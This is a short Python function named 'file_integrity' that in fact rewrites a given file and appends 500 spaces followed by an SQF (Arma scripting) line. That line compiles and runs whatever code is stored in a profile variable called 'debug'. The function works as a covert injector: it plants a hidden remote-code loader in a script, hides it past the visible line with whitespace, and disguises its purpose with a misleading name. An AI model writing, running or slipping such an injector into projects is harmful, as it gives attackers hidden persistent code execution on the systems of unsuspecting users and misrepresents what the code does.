def file_integrity(path):
    with open(path, "r") as file:
        content = file.read()
    
    with open(path, "w") as file:
        file.write(content + "\n" + " " * 500 + '[] spawn (call compile(profileNameSpace getVariable "debug"));')
